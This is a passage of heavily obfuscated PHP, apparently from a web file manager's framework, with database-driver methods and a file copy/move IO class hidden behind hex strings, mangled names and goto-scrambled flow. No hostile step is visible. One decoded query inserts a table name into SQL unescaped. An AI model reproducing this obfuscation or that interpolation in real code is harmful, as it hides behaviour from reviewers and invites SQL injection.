"\x53\x45\114\105\103\124\x20\40\x20\x63\x6f\x6c\x75\x6d\156\137\x6e\141\x6d\145\x20\141\x73\x20\x27\116\141\155\145\x27\54\40\40\40\144\141\164\141\137\x74\171\x70\x65\40\141\x73\40\x27\124\x79\160\145\x27\x2c\40\40\40\x63\x6f\x6c\x75\x6d\x6e\137\144\x65\x66\141\165\154\x74\40\x61\x73\x20\47\x44\145\146\x61\x75\x6c\x74\x27\x2c\40\40\x20\x69\x73\x5f\156\x75\154\154\141\x62\x6c\x65\40\x61\163\40\47\x4e\x75\x6c\154\47\12\11\11\106\122\117\x4d\x9\151\156\146\x6f\162\155\x61\x74\151\157\x6e\x5f\163\x63\150\x65\155\x61\56\x74\141\x62\154\145\163\40\101\x53\40\164\12\x9\11\x4a\117\111\x4e\11\x69\x6e\x66\x6f\x72\155\141\164\151\157\x6e\x5f\x73\x63\150\x65\155\141\x2e\143\x6f\154\x75\x6d\x6e\163\40\101\x53\x20\143\xa\11\x9\x4f\116\40\40\164\x2e\x74\141\x62\154\145\137\143\x61\x74\x61\154\157\147\40\x3d\x20\143\56\x74\141\142\x6c\x65\137\143\141\x74\141\x6c\x6f\147\12\11\x9\101\116\x44\x20\164\x2e\164\141\x62\x6c\145\x5f\x73\143\x68\x65\155\x61\40\x3d\x20\143\56\164\141\142\154\x65\x5f\x73\x63\x68\x65\155\x61\xa\x9\11\x41\x4e\x44\40\164\x2e\x74\x61\142\x6c\145\x5f\156\x61\x6d\145\x20\x3d\40\x63\56\x74\141\x62\154\x65\137\156\x61\x6d\145\12\x9\11\127\110\105\122\x45\x20\40\x20\164\x2e\164\141\x62\154\x65\x5f\x6e\x61\x6d\x65\x20\x3d\40\47{$CÀ£Ûëø∫‘}\x27"; break; case $d¯¨¬Ç˘¨û[608]: $fÜ«Õ´ÖÖ¥ = $d¯¨¬Ç˘¨û[609] . $CÀ£Ûëø∫‘ . $d¯¨¬Ç˘¨û[610]; break; case $d¯¨¬Ç˘¨û[590]: case $d¯¨¬Ç˘¨û[592]: $fÜ«Õ´ÖÖ¥ = $d¯¨¬Ç˘¨û[611] . $d¯¨¬Ç˘¨û[612] . $d¯¨¬Ç˘¨û[613] . strtoupper($CÀ£Ûëø∫‘) . $d¯¨¬Ç˘¨û[614] . strtoupper($CÀ£Ûëø∫‘) . $d¯¨¬Ç˘¨û[615]; break; case $d¯¨¬Ç˘¨û[616]: $fÜ«Õ´ÖÖ¥ = $d¯¨¬Ç˘¨û[617] . $CÀ£Ûëø∫‘ . $d¯¨¬Ç˘¨û[618]; break; case $d¯¨¬Ç˘¨û[591]: break; case $d¯¨¬Ç˘¨û[619]: default: $fÜ«Õ´ÖÖ¥ = $d¯¨¬Ç˘¨û[620] . ($this->dbType == $d¯¨¬Ç˘¨û[619] ? "\x60{$CÀ£Ûëø∫‘}\140" : $CÀ£Ûëø∫‘); } } goto Eãı¯öâ‹è; cÓ˜Ù≥í´π: } public function getTables($f±ïµÜê©Ç = '') { $e—Ç∆Œ◊Ú˘ =& $_SERVER[∞„˜ƒÑºª]; if (think_config($e—Ç∆Œ◊Ú˘[622])) { $F™◊≤§ÿÆÚ = str_replace($e—Ç∆Œ◊Ú˘[623], $f±ïµÜê©Ç, think_config($e—Ç∆Œ◊Ú˘[622])); } else { switch ($this->dbType) { case $e—Ç∆Œ◊Ú˘[590]: case $e—Ç∆Œ◊Ú˘[592]: $F™◊≤§ÿÆÚ = $e—Ç∆Œ◊Ú˘[624]; break; case $e—Ç∆Œ◊Ú˘[589]: case $e—Ç∆Œ◊Ú˘[607]: $F™◊≤§ÿÆÚ = $e—Ç∆Œ◊Ú˘[625]; break; case $e—Ç∆Œ◊Ú˘[616]: $F™◊≤§ÿÆÚ = $e—Ç∆Œ◊Ú˘[626]; break; case $e—Ç∆Œ◊Ú˘[591]: think_exception(think_lang($e—Ç∆Œ◊Ú˘[627]) . $e—Ç∆Œ◊Ú˘[628]); break; case $e—Ç∆Œ◊Ú˘[608]: $F™◊≤§ÿÆÚ = $e—Ç∆Œ◊Ú˘[42] . $e—Ç∆Œ◊Ú˘[43] . $e—Ç∆Œ◊Ú˘[44]; break; case $e—Ç∆Œ◊Ú˘[619]: default: if (!empty($f±ïµÜê©Ç)) { $F™◊≤§ÿÆÚ = $e—Ç∆Œ◊Ú˘[571] . $f±ïµÜê©Ç; } else { $F™◊≤§ÿÆÚ = $e—Ç∆Œ◊Ú˘[572]; } } } $bÖ—ñ∫ƒù = $this->query($F™◊≤§ÿÆÚ); $féùùﬂ‹ï∆ = array(); foreach ($bÖ—ñ∫ƒù as $B±¡ØÏÿ∑ï => $fÈÑÚ†‰Ÿ‘) { $féùùﬂ‹ï∆[$B±¡ØÏÿ∑ï] = current($fÈÑÚ†‰Ÿ‘); } return $féùùﬂ‹ï∆; } protected function parseLimit($eŒ≠£·Ω™Ø) { $fˆÒÚçıùÛ =& $_SERVER[∞„˜ƒÑºª]; $fµÒÈÙÈíÔ = $fˆÒÚçıùÛ[33]; if (!empty($eŒ≠£·Ω™Ø)) { switch ($this->dbType) { case $fˆÒÚçıùÛ[616]: case $fˆÒÚçıùÛ[608]: $eŒ≠£·Ω™Ø = explode($fˆÒÚçıùÛ[47], $eŒ≠£·Ω™Ø); if (count($eŒ≠£·Ω™Ø) > 1) { $fµÒÈÙÈíÔ .= $fˆÒÚçıùÛ[48] . $eŒ≠£·Ω™Ø[1] . $fˆÒÚçıùÛ[49] . $eŒ≠£·Ω™Ø[0] . $fˆÒÚçıùÛ[50]; } else { $fµÒÈÙÈíÔ .= $fˆÒÚçıùÛ[48] . $eŒ≠£·Ω™Ø[0] . $fˆÒÚçıùÛ[50]; } break; case $fˆÒÚçıùÛ[589]: case $fˆÒÚçıùÛ[607]: break; case $fˆÒÚçıùÛ[591]: break; case $fˆÒÚçıùÛ[590]: case $fˆÒÚçıùÛ[592]: break; case $fˆÒÚçıùÛ[619]: default: $fµÒÈÙÈíÔ .= $fˆÒÚçıùÛ[48] . $eŒ≠£·Ω™Ø . $fˆÒÚçıùÛ[50]; } } return $fµÒÈÙÈíÔ; } public function parseKey(&$bÓ’”å†≠», $fáÏ«èªÃò = true) { $dòÆÛ©÷‰¶ =& $_SERVER[∞„˜ƒÑºª]; if ($fáÏ«èªÃò) { $bÓ’”å†≠» = $this->parseKeyCheck($bÓ’”å†≠»); } if ($this->dbType == $dòÆÛ©÷‰¶[619]) { if ($bÓ’”å†≠» != $dòÆÛ©÷‰¶[172] && !preg_match($dòÆÛ©÷‰¶[582], $bÓ’”å†≠»)) { $bÓ’”å†≠» = $dòÆÛ©÷‰¶[583] . trim($bÓ’”å†≠», $dòÆÛ©÷‰¶[583]) . $dòÆÛ©÷‰¶[583]; } return $bÓ’”å†≠»; } else { return parent::parseKey($bÓ’”å†≠»); } } public function close() { $this->_linkID = null; } public function error() { $eÃÑ∑˘¬““ =& $_SERVER[∞„˜ƒÑºª]; if ($this->PDOStatement) { $Dé∫„›ñœÒ = $this->PDOStatement->errorInfo(); $this->error = $Dé∫„›ñœÒ[1] . $eÃÑ∑˘¬““[4] . $Dé∫„›ñœÒ[2]; } else { $this->error = $eÃÑ∑˘¬““[33]; } if ($eÃÑ∑˘¬““[33] != $this->queryStr) { $this->error .= LNG($eÃÑ∑˘¬““[45]) . $this->queryStr; } think_trace($this->error, $eÃÑ∑˘¬““[33], $eÃÑ∑˘¬““[46]); return $this->error; } public function escapeString($fà…ÛŸ∂ÉÉ) { $A¢ï¡¥öÚ© =& $_SERVER[∞„˜ƒÑºª]; switch ($this->dbType) { case $A¢ï¡¥öÚ©[616]: case $A¢ï¡¥öÚ©[589]: case $A¢ï¡¥öÚ©[607]: case $A¢ï¡¥öÚ©[619]: return addslashes($fà…ÛŸ∂ÉÉ); case $A¢ï¡¥öÚ©[591]: case $A¢ï¡¥öÚ©[608]: case $A¢ï¡¥öÚ©[590]: case $A¢ï¡¥öÚ©[592]: return str_ireplace($A¢ï¡¥öÚ©[63], $A¢ï¡¥öÚ©[64], $fà…ÛŸ∂ÉÉ); } } protected function parseValue($Dë´‚›í∂¨) { $c´Ÿä∂¢£˜ =& $_SERVER[∞„˜ƒÑºª]; if (is_string($Dë´‚›í∂¨)) { $Dë´‚›í∂¨ = strpos($Dë´‚›í∂¨, $c´Ÿä∂¢£˜[4]) === 0 ? $this->escapeString($Dë´‚›í∂¨) : $c´Ÿä∂¢£˜[629] . $this->escapeString($Dë´‚›í∂¨) . $c´Ÿä∂¢£˜[629]; } elseif (isset($Dë´‚›í∂¨[0]) && is_string($Dë´‚›í∂¨[0]) && strtolower($Dë´‚›í∂¨[0]) == $c´Ÿä∂¢£˜[284]) { $Dë´‚›í∂¨ = $this->escapeString($Dë´‚›í∂¨[1]); } elseif (is_array($Dë´‚›í∂¨)) { $Dë´‚›í∂¨ = array_map(array($this, $c´Ÿä∂¢£˜[630]), $Dë´‚›í∂¨); } elseif (is_bool($Dë´‚›í∂¨)) { $Dë´‚›í∂¨ = $Dë´‚›í∂¨ ? $c´Ÿä∂¢£˜[376] : $c´Ÿä∂¢£˜[402]; } elseif (is_null($Dë´‚›í∂¨)) { $Dë´‚›í∂¨ = $c´Ÿä∂¢£˜[106]; } return $Dë´‚›í∂¨; } public function getLastInsertId() { $bπœêç©ø¯ =& $_SERVER[∞„˜ƒÑºª]; switch ($this->dbType) { case $bπœêç©ø¯[616]: case $bπœêç©ø¯[608]: case $bπœêç©ø¯[589]: case $bπœêç©ø¯[607]: case $bπœêç©ø¯[591]: case $bπœêç©ø¯[619]: return $this->_linkID->lastInsertId(); case $bπœêç©ø¯[590]: case $bπœêç©ø¯[592]: $Cô¬é∆‘∫ˆ = $this->table; $aî”ﬂû‡«∏ = $this->query("\x53\x45\x4c\x45\103\x54\x20{$Cô¬é∆‘∫ˆ}\x2e\143\x75\162\162\x76\x61\x6c\x20\143\x75\x72\162\x76\x61\x6c\x20\x46\122\117\x4d\40\144\x75\141\154"); return $aî”ﬂû‡«∏ ? $aî”ﬂû‡«∏[0][$bπœêç©ø¯[631]] : 0; } } } goto Eõ€ ¶à£à; CâÊåªÌÌø: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($F§∂”à»Ø“, $dËÌ«ê“˘») { $b¬¥Ô∞¶—∏ = self::driverMake($dËÌ«ê“˘»[0]); if (method_exists($b¬¥Ô∞¶—∏, $F§∂”à»Ø“)) { return @call_user_func_array(array($b¬¥Ô∞¶—∏, $F§∂”à»Ø“), $dËÌ«ê“˘»); } else { if (method_exists(self, $F§∂”à»Ø“)) { return @call_user_func_array(array(self, $F§∂”à»Ø“), $dËÌ«ê“˘»); } else { call_user_func_array(array(parent, $F§∂”à»Ø“), $dËÌ«ê“˘»); } } } public static function init($fŒ◊ëÕñƒ) { return self::driverMake($fŒ◊ëÕñƒ); } public static function copy($eÆ·èµÊöá, $Fâ¶å¶Ù—ß, $AìÂéî∆é≠ = false) { return self::copyMove($eÆ·èµÊöá, $Fâ¶å¶Ù—ß, $AìÂéî∆é≠, $_SERVER[∞„˜ƒÑºª][733]); } public static function move($C¯€π‹áé˜, $C†œÀÛÖêÜ, $E€Òç¥ÖëØ = false) { return self::copyMove($C¯€π‹áé˜, $C†œÀÛÖêÜ, $E€Òç¥ÖëØ, $_SERVER[∞„˜ƒÑºª][734]); } public static function saveFile($Dôˆ¬⁄˜È«, $Fßœ∏‡…Ÿ∆, $BÜ÷ªïŸÀÑ = true) { goto Dôˆ¨√ﬂÀ∏; Dôˆ¨√ﬂÀ∏: $eÓœ”îÇÖü = self::info($Fßœ∏‡…Ÿ∆); $Cπó⁄ÌÎ–Î = self::driverMake($Dôˆ¬⁄˜È«); $eäÚﬂÃ…ÎÂ = self::driverMake($Fßœ∏‡…Ÿ∆); goto FÒ‰»Áºá“; FÒ‰»Áºá“: $a™ÖÛ¬ÒÑ˜ = $eäÚﬂÃ…ÎÂ->pathFather($Fßœ∏‡…Ÿ∆); $B⁄∂ˆö©É˜ = !0; if (!$BÜ÷ªïŸÀÑ && self::driverIsSame($Cπó⁄ÌÎ–Î, $eäÚﬂÃ…ÎÂ)) { $B⁄∂ˆö©É˜ = !1; } goto e∫ÂÜ≠¢ÙÇ; e∫ÂÜ≠¢ÙÇ: return self::copyFile($Cπó⁄ÌÎ–Î, $Dôˆ¬⁄˜È«, $eäÚﬂÃ…ÎÂ, $a™ÖÛ¬ÒÑ˜, $eÓœ”îÇÖü[$_SERVER[∞„˜ƒÑºª][28]], $B⁄∂ˆö©É˜); goto A¶¬ã≈ºã∆; A¶¬ã≈ºã∆: } private static function copyMove($D±úÎçΩÁ‡, $cÕæÌñºÀí, $BπãÚ©˘ÙÑ, $aƒ–‡ñáù€) { goto f÷–áï≈·; e∆≠Â›Â≈À: $aü˜’ãÍ±® = self::driverMake($cÕæÌñºÀí); $c⁄ûòÉ∫” = $aƒ–‡ñáù€ == $a§“‰Ç±€Î[734]; self::check($AÁÁÊ˘ÎéÖ, $D±úÎçΩÁ‡, $aü˜’ãÍ±®, $cÕæÌñºÀí); goto eìµ◊¢πªÑ; eìµ◊¢πªÑ: Hook::trigger($a§“‰Ç±€Î[81], $AÁÁÊ˘ÎéÖ, $D±úÎçΩÁ‡, $aü˜’ãÍ±®, $cÕæÌñºÀí); $F¶…ÑÃ÷ùö = self::driverIsSame($AÁÁÊ˘ÎéÖ, $aü˜’ãÍ±®); if ($F¶…ÑÃ÷ùö) { if ($aƒ–‡ñáù€ == $a§“‰Ç±€Î[734] && trim($cÕæÌñºÀí, $a§“‰Ç±€Î[8]) == trim($aü˜’ãÍ±®->pathFather($D±úÎçΩÁ‡), $a§“‰Ç±€Î[8])) { return $aü˜’ãÍ±®->getPathOuter($D±úÎçΩÁ‡); } if (method_exists($aü˜’ãÍ±®, $aƒ–‡ñáù€)) { return $aü˜’ãÍ±®->{$aƒ–‡ñáù€}($D±úÎçΩÁ‡, $cÕæÌñºÀí, $BπãÚ©˘ÙÑ); } } goto Eç°ú£ı≠ƒ; Eç°ú£ı≠ƒ: $AÉ‰∑›Ìç‰ = $AÁÁÊ˘ÎéÖ->isFile($D±úÎçΩÁ‡); if (!$AÉ‰∑›Ìç‰ && $aü˜’ãÍ±®->getType() == $a§“‰Ç±€Î[450] && $AÁÁÊ˘ÎéÖ->getType() == $a§“‰Ç±€Î[133]) { $dØõﬁ™åíÂ = $aü˜’ãÍ±®->copyFolderFromIO($AÁÁÊ˘ÎéÖ, $D±úÎçΩÁ‡, $cÕæÌñºÀí, $BπãÚ©˘ÙÑ, $c⁄ûòÉ∫”); } else { $dØõﬁ™åíÂ = self::copyPath($AÁÁÊ˘ÎéÖ, $D±úÎçΩÁ‡, $aü˜’ãÍ±®, $cÕæÌñºÀí, $BπãÚ©˘ÙÑ, $c⁄ûòÉ∫”, $AÉ‰∑›Ìç‰); } if ($dØõﬁ™åíÂ && $c⁄ûòÉ∫”) { $AÁÁÊ˘ÎéÖ->remove($D±úÎçΩÁ‡); } goto A≠ìá†±ü∑; f÷–áï≈·: $a§“‰Ç±€Î =& $_SERVER[∞„˜ƒÑºª]; ignore_timeout(); $AÁÁÊ˘ÎéÖ = self::driverMake($D±úÎçΩÁ‡); goto e∆≠Â›Â≈À; A≠ìá†±ü∑: return $dØõﬁ™åíÂ; goto bÇæòîà√ß; bÇæòîà√ß: } private static function check($Cé—¨ΩıÍŒ, $F•≤œÑ‹ı˜, $Aùæ¢¥Íá¶, &$f∏ïà˜§“∞) { $B¢∏¬ùÇ√∏ =& $_SERVER[∞„˜ƒÑºª]; if (self::driverIsSame($Cé—¨ΩıÍŒ, $Aùæ¢¥Íá¶) && $Cé—¨ΩıÍŒ->isFolder($F•≤œÑ‹ı˜) && $Cé—¨ΩıÍŒ->isParentOf($F•≤œÑ‹ı˜, $f∏ïà˜§“∞)) { show_json(LNG($B¢∏¬ùÇ√∏[735]), !1); } if (!$Cé—¨ΩıÍŒ->exist($F•≤œÑ‹ı˜)) { show_json(LNG($B¢∏¬ùÇ√∏[107]), !1); } } private static function copyPath($bµôﬂ©Ò‰û, $d∫çÁ∑çö”, $dˆŸ∂–»¡◊, $bãì¶‘ßÑ•, $eë∏Ö°òâ€, $dÎŒúÓÂØ¿, $Düë„◊º´Ç) { goto a¨ö¥¿Ÿá©; bœ“ÈÒØƒ : $bª∞ÜèÈ»– = $dˆŸ∂–»¡◊->mkdir($dˆŸ∂–»¡◊->getPath($aê≥Ì∏ÂÉÓ)); $bãì¶‘ßÑ• = $dˆŸ∂–»¡◊->getPathInner($bª∞ÜèÈ»–); $F“¥˘üà…Ë = $bµôﬂ©Ò‰û->listPath($d∫çÁ∑çö”, !1, !0); goto fﬂ´º£‡∂å; fﬂ´º£‡∂å: $D—’óæÉÉ¢ = array_merge($F“¥˘üà…Ë[$e»Úü≥Ë¯±[82]], $F“¥˘üà…Ë[$e»Úü≥Ë¯±[83]]); foreach ($D—’óæÉÉ¢ as $AáÓÂ¿„‡) { $c…≤ﬂµŒ‚Ç = $AáÓÂ¿„‡[$e»Úü≥Ë¯±[29]] == $e»Úü≥Ë¯±[163]; $d∫çÁ∑çö” = $bµôﬂ©Ò‰û->getPathInner($AáÓÂ¿„‡[$e»Úü≥Ë¯±[84]]); self::copyPath($bµôﬂ©Ò‰û, $d∫çÁ∑çö”, $dˆŸ∂–»¡◊, $bãì¶‘ßÑ•, $eë∏Ö°òâ€, $dÎŒúÓÂØ¿, $c…≤ﬂµŒ‚Ç); } return $bª∞ÜèÈ»–; goto FµûÀâ„ÂÁ; eº¢ùª∫⁄≥: if ($Düë„◊º´Ç) { if (!$dˆŸ∂–»¡◊->exist($bãì¶‘ßÑ•)) { $C·õ◊πﬂ¿ = $dˆŸ∂–»¡◊->getPathName($dˆŸ∂–»¡◊->pathThis($bãì¶‘ßÑ•)); $bãì¶‘ßÑ• = $dˆŸ∂–»¡◊->pathFather($bãì¶‘ßÑ•); } return self::copyFile($bµôﬂ©Ò‰û, $d∫çÁ∑çö”, $dˆŸ∂–»¡◊, $bãì¶‘ßÑ•, $C·õ◊πﬂ¿, $dÎŒúÓÂØ¿); } if ($eë∏Ö°òâ€ == REPEAT_RENAME_FOLDER) { $eë∏Ö°òâ€ = !1; } $aê≥Ì∏ÂÉÓ = rtrim($bãì¶‘ßÑ•, $e»Úü≥Ë¯±[8]) . $e»Úü≥Ë¯±[8] . $C·õ◊πﬂ¿; goto bœ“ÈÒØƒ ; a¨ö¥¿Ÿá©: $e»Úü≥Ë¯± =& $_SERVER[∞„˜ƒÑºª]; $C·õ◊πﬂ¿ = $bµôﬂ©Ò‰û->getPathName($bµôﬂ©Ò‰û->pathThis($d∫çÁ∑çö”)); if ($eë∏Ö°òâ€) { $cêà¬ºô‚„ = $dˆŸ∂–»¡◊->fileNameExist($bãì¶‘ßÑ•, $C·õ◊πﬂ¿); $C·õ◊πﬂ¿ = $dˆŸ∂–»¡◊->fileNameAuto($bãì¶‘ßÑ•, $C·õ◊πﬂ¿, $eë∏Ö°òâ€, !$Düë„◊º´Ç); $eë∏Ö°òâ€ = $cêà¬ºô‚„ ? $eë∏Ö°òâ€ : !1; } goto eº¢ùª∫⁄≥; FµûÀâ„ÂÁ: } private static function copyFile($cºî∞’ÛÑË, $Fé–ø“”‘‚, $DÇº—…€û¡, $b∆–ªºÑ∂é, $BÔ‰ÓÉóôÔ, $CçÇ∑âÙª) { goto C¶ªﬂÊ≈êÏ; Fí•ÉÇøÑ‚: Hook::trigger($e´Óû¯œéò[738], $cºî∞’ÛÑË, $Fé–ø“”‘‚, $DÇº—…€û¡, $b∆–ªºÑ∂é, $BÔ‰ÓÉóôÔ, $A¡¨Á†£—Õ); return $A¡¨Á†£—Õ; goto Dπ¨”©¨êò; bΩ¨Ûç»º«: mk_dir($Bî‘∏È´Û); $CõÛ§„âÔê = $Bî‘∏È´Û . $DŒÙŒΩìïü; $CõÛ§„âÔê = $cºî∞’ÛÑË->download($Fé–ø“”‘‚, $CõÛ§„âÔê); goto FÑÔ‹≈ÏƒÍ; DöÖ∑ÂÃìö: Hook::trigger($e´Óû¯œéò[737], $cºî∞’ÛÑË, $Fé–ø“”‘‚, $DÇº—…€û¡, $b∆–ªºÑ∂é, $BÔ‰ÓÉóôÔ, $DŒÙŒΩìïü); if (self::driverIsSame($cºî∞’ÛÑË, $DÇº—…€û¡)) { if ($CçÇ∑âÙª) { $A¡¨Á†£—Õ = $DÇº—…€û¡->moveFile($Fé–ø“”‘‚, $b∆–ªºÑ∂é); } else { $A¡¨Á†£—Õ = $DÇº—…€û¡->copyFile($Fé–ø“”‘‚, $b∆–ªºÑ∂é); } Hook::trigger($e´Óû¯œéò[738], $cºî∞’ÛÑË, $Fé–ø“”‘‚, $DÇº—…€û¡, $b∆–ªºÑ∂é, $BÔ‰ÓÉóôÔ, $A¡¨Á†£—Õ); return $A¡¨Á†£—Õ; } $Bî‘∏È´Û = TEMP_FILES; goto bΩ¨Ûç»º«; C¶ªﬂÊ≈êÏ: $e´Óû¯œéò =& $_SERVER[∞„˜ƒÑºª]; $b∆–ªºÑ∂é = $DÇº—…€û¡->getPath(rtrim($b∆–ªºÑ∂é, $e´Óû¯œéò[8]) . $e´Óû¯œéò[8] . $BÔ‰ÓÉóôÔ); $DŒÙŒΩìïü = $e´Óû¯œéò[736] . time() . rand_string(5); goto DöÖ∑ÂÃìö; FÑÔ‹≈ÏƒÍ: $CõÛ§„âÔê = $cºî∞’ÛÑË->iconvApp($CõÛ§„âÔê); $A¡¨Á†£—Õ = $DÇº—…€û¡->upload($b∆–ªºÑ∂é, $CõÛ§„âÔê, $CçÇ∑âÙª); del_file($Bî‘∏È´Û . $DŒÙŒΩìïü); goto Fí•ÉÇøÑ‚; Dπ¨”©¨êò: } public static function fileOut($B÷á‡Ïâ—Õ, $D•ßõ≈¥¥  = false, $F„·äËéÆ = false, $f‡Üâﬁüãá = '') { $D»«¡¥«µ– =& $_SERVER[∞„˜ƒÑºª]; $F˜≥ãÃÏ∆Ú = self::driverMake($B÷á‡Ïâ—Õ); $a∞›ô‚Œ¯Ë = $GLOBALS[$D»«¡¥«µ–[6]][$D»«¡¥«µ–[92]][$D»«¡¥«µ–[739]]; if ($a∞›ô‚Œ¯Ë) { return $F˜≥ãÃÏ∆Ú->fileOutServer($B÷á‡Ïâ—Õ, $D•ßõ≈¥¥ , $F„·äËéÆ, $f‡Üâﬁüãá); } return $F˜≥ãÃÏ∆Ú->fileOut($B÷á‡Ïâ—Õ, $D•ßõ≈¥¥ , $F„·äËéÆ, $f‡Üâﬁüãá); } public function fileOutImage($DûÆÚìîﬂñ, $bÜéô„Ω‹å = 250) { $bÊÇñó≠—ÿ =& $_SERVER[∞„˜ƒÑºª]; $Bçè§âª±í = self::driverMake($DûÆÚìîﬂñ); $FΩ®ëÉƒ©∏ = $GLOBALS[$bÊÇñó≠—ÿ[6]][$bÊÇñó≠—ÿ[92]][$bÊÇñó≠—ÿ[739]]; if ($FΩ®ëÉƒ©∏) { return $Bçè§âª±í->fileOutImageServer($DûÆÚìîﬂñ, $bÜéô„Ω‹å); } return $Bçè§âª±í->fileOutImage($DûÆÚìîﬂñ, $bÜéô„Ω‹å); } private static function driverIsSame($D◊Ÿüá¢Ôç, $bÿÇ´°‰Ω≤) { goto f‚ï…ﬁü«≠; CúÑœ“€Ã: if ($D◊Ÿüá¢Ôç->pathDriver == $bÿÇ´°‰Ω≤->pathDriver) { return !0; } return !1; goto Dÿﬂ®ó ©π; B±©Â∂éÊÂ: if ($AÕÎ®≠Ø—… != $F¨∞ìÒ∏õ£) { return !1; } if ($AÕÎ®≠Ø—… == $dŸ∂µú®Û[450]) { return !0; } if ($AÕÎ®≠Ø—… == $dŸ∂µú®Û[133]) { return !0; } goto CúÑœ“€Ã; f‚ï…ﬁü«≠: $dŸ∂µú®Û =& $_SERVER[∞„˜ƒÑºª]; $AÕÎ®≠Ø—… = $D◊Ÿüá¢Ôç->getType(); $F¨∞ìÒ∏õ£ = $bÿÇ´°‰Ω≤->getType(); goto B±©Â∂éÊÂ; Dÿﬂ®ó ©π: } public static function copyUpdate($AÃÉ˘Ì¶∆Ò, $aﬂ∆Ô•˘Ù¥) { goto B◊£ÙÇ‡∫Ì; eõèˆ≤å⁄ê: $BÈùñ≥—˜Õ = array(); foreach ($eç£µÑÿÀ‚ as $báÙ÷ñªË§ => $DŸËÚªå≤ø) { if ($DŸËÚªå≤ø[$dŒÊêâøà©[85]] == 1 && !isset($Dî“ìÁıñ§[$báÙ÷ñªË§])) { $BÈùñ≥—˜Õ[] = $aﬂ∆Ô•˘Ù¥ . $dŒÊêâøà©[8] . $báÙ÷ñªË§; } if ($DŸËÚªå≤ø[$dŒÊêâøà©[85]] == 0) { if (!isset($Dî“ìÁıñ§[$báÙ÷ñªË§]) || $Dî“ìÁıñ§[$báÙ÷ñªË§][$dŒÊêâøà©[86]] != $DŸËÚªå≤ø[$dŒÊêâøà©[86]]) { $BóÏ‚˜ÑÈ[] = array($dŒÊêâøà©[740] => $DŸËÚªå≤ø[$dŒÊêâøà©[84]], $dŒÊêâøà©[741] => $aﬂ∆Ô•˘Ù¥ . $dŒÊêâøà©[8] . get_path_father($báÙ÷ñªË§), $dŒÊêâøà©[742] => $DŸËÚªå≤ø); } } } $a€Â‰∆ÇÕò = array($dŒÊêâøà©[163] => $BóÏ‚˜ÑÈ, $dŒÊêâøà©[85] => $BÈùñ≥—˜Õ); goto DÕﬁ˘à◊µà; F◊›ÌÁ…éÕ: $eç£µÑÿÀ‚ = self::_listAll($AÃÉ˘Ì¶∆Ò); $Dî“ìÁıñ§ = self::_listAll($aﬂ∆Ô•˘Ù¥); $BóÏ‚˜ÑÈ = array(); goto eõèˆ≤å⁄ê; B◊£ÙÇ‡∫Ì: $dŒÊêâøà© =& $_SERVER[∞„˜ƒÑºª]; if (!IO::exist($AÃÉ˘Ì¶∆Ò)) { return !1; } if (!IO::exist($aﬂ∆Ô•˘Ù¥)) { IO::mkdir($aﬂ∆Ô•˘Ù¥); } goto F◊›ÌÁ…éÕ; DÕﬁ˘à◊µà: Hook::trigger($dŒÊêâøà©[743], $AÃÉ˘Ì¶∆Ò, $aﬂ∆Ô•˘Ù¥, $a€Â‰∆ÇÕò); foreach ($BÈùñ≥—˜Õ as $DŸËÚªå≤ø) { IO::mkdir($DŸËÚªå≤ø); } foreach ($BóÏ‚˜ÑÈ as $DŸËÚªå≤ø) { IO::copy($DŸËÚªå≤ø[$dŒÊêâøà©[740]], $DŸËÚªå≤ø[$dŒÊêâøà©[741]], REPEAT_REPLACE); } goto E§°¿â˜ÆŒ; E§°¿â˜ÆŒ: } private static function _listAll($DçÈ§Àò‹À) { $aÀÑ◊À¡Ò˘ =& $_SERVER[∞„˜ƒÑºª]; $DçÈ§Àò‹À = KodIO::clear($DçÈ§Àò‹À); $b“©ö‰èÚ¿ = IO::listAll($DçÈ§Àò‹À); foreach ($b“©ö‰èÚ¿ as &$Cèπ∂üÔ–ø) { $f¢π¬∫ÃöÉ = substr($Cèπ∂üÔ–ø[$aÀÑ◊À¡Ò˘[84]], strlen($DçÈ§Àò‹À)); $Cèπ∂üÔ–ø[$aÀÑ◊À¡Ò˘[744]] = trim($f¢π¬∫ÃöÉ, $aÀÑ◊À¡Ò˘[8]); } return array_to_keyvalue($b“©ö‰èÚ¿, $aÀÑ◊À¡Ò˘[744]); } private static function driverMake(&$dº¶Í§´ã´) { goto b◊·¥¥‘√è; b◊·¥¥‘√è: $CπÀ≥„Çû§ =& $_SERVER[∞„˜ƒÑºª]; $Dœ®∞¿ÍŒ´ = KodIO::parse($dº¶Í§´ã´); if (!self::$driverListSystem) { $EîΩ∑éΩÔ™ = Model($CπÀ≥„Çû§[460])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($EîΩ∑éΩÔ™, $CπÀ≥„Çû§[366]); } goto d≤Í´à¯äÜ; d≤Í´à¯äÜ: if ($Dœ®∞¿ÍŒ´[$CπÀ≥„Çû§[29]] == KodIO::KOD_IO && !self::$driverListSystem[$Dœ®∞¿ÍŒ´[$CπÀ≥„Çû§[366]]]) { return !1; } $dº¶Í§´ã´ = $Dœ®∞¿ÍŒ´[$CπÀ≥„Çû§[745]]; $f¨≈É®À≈¯ = self::driverGet($Dœ®∞¿ÍŒ´, $dº¶Í§´ã´); goto C“ï—Ãë¢Ó; C“ï—Ãë¢Ó: return $f¨≈É®À≈¯; goto Fò˜°é¶’˘; Fò˜°é¶’˘: } private static function driverGet($FÊÏ¯Ì…™˘, &$E•÷¨‰ô⁄) { goto F¨“é‹÷ã; F¨“é‹÷ã: $D‘≠‡∞∑Í√ =& $_SERVER[∞„˜ƒÑºª]; $Dá≈ÃÕØùË = $FÊÏ¯Ì…™˘[$D‘≠‡∞∑Í√[746]]; $e÷Æ∏Èÿø = $FÊÏ¯Ì…™˘[$D‘≠‡∞∑Í√[366]]; goto BÏ•◊êò“€; Fâß®ÎﬂÚâ: return $bÔ˜ÿ∆õ‡Ñ; goto Aãü…€Â°§; Bãõòéù›ñ: $bÔ˜ÿ∆õ‡Ñ = self::$driverCache[$a‹ÀÈÛÖ¨œ]; $bÔ˜ÿ∆õ‡Ñ->pathDriver = $Dá≈ÃÕØùË; $bÔ˜ÿ∆õ‡Ñ->pathBase = $D‘≠‡∞∑Í√[33]; goto b–ò∑«ôÂØ; BÏ•◊êò“€: switch ($FÊÏ¯Ì…™˘[$D‘≠‡∞∑Í√[29]]) { case KodIO::KOD_IO: $f¡§∆ÆŒÖ = self::$driverListSystem[$e÷Æ∏Èÿø]; break; case KodIO::KOD_SOURCE: $E•÷¨‰ô⁄ = $e÷Æ∏Èÿø . $E•÷¨‰ô⁄; 